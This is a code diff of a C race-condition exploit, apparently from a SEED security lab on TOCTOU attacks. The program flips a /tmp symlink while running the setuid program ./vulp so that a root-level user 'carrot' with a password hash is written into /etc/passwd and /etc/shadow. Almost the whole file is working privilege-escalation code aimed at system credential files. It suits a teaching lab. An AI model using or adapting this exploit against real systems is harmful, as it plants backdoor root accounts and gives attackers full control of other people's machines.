@@ -3,15 +3,33 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/stat.h>
+#include <sys/types.h>
+#include <fcntl.h>
 
 #define LINK "/tmp/XYZ"
 #define DUMMY "/home/seed/Documents/ssof/lab2/dummy"
 
-void race ( char *filename, char *command ) {
+extern FILE *stdin;
+extern FILE *stdout;
 
+void race ( char *filename, char *carrot_name, char *carrot_string) {
+
+	/* Declare variables */
 	struct stat st;
 	int inicial_size, final_size, counter = 1;
+	FILE *carrot_file = NULL, *null_file = NULL;
 
+	/* Add input to file */
+	unlink( carrot_name );
+	carrot_file = fopen( carrot_name, "w" ),
+	fprintf(carrot_file, "%s", carrot_string);
+	fclose(carrot_file);
+
+	/* Get I/O descriptors */
+	carrot_file = fopen( carrot_name, "r" );
+	null_file   = fopen( "/dev/null", "w" );
+
+	/* Get file inicial size */
 	stat( filename, &st );
 	inicial_size = st.st_size;
 
@@ -22,8 +40,12 @@ void race ( char *filename, char *command ) {
 		symlink( DUMMY, LINK );
 
 		if( fork() == 0 ) {
-			system( command );
+			
+			stdin  = carrot_file;
+			stdout = null_file;
+			execl( "./vulp", "vulp", NULL );
 			exit( EXIT_SUCCESS );
+
 		}
 
 		/* Wait for program */
@@ -49,17 +71,8 @@ void race ( char *filename, char *command ) {
 
 int main ( int argc, char** argv ) {
 
-	unlink( "/tmp/race_passwd" );
-	unlink( "/tmp/race_shadow" );
-	FILE *passwd_file = fopen( "/tmp/race_passwd", "w" ),
-             *shadow_file = fopen( "/tmp/race_shadow", "w" );
-	fprintf(passwd_file, "carrot:x:0:0:carrot:/root:/bin/bash");
-	fprintf(shadow_file, "carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::");
-	fclose(passwd_file);
-	fclose(shadow_file);
-
-	race( "/etc/passwd", "./vulp < /tmp/race_passwd > /dev/null" );
-	race( "/etc/shadow", "./vulp < /tmp/race_shadow > /dev/null" );
+	race( "/etc/passwd", "/tmp/race_passwd", "carrot:x:0:0:carrot:/root:/bin/bash" );
+	race( "/etc/shadow", "/tmp/race_shadow", "carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::" );
 
 	/* End process successfully */
 	exit( EXIT_SUCCESS );
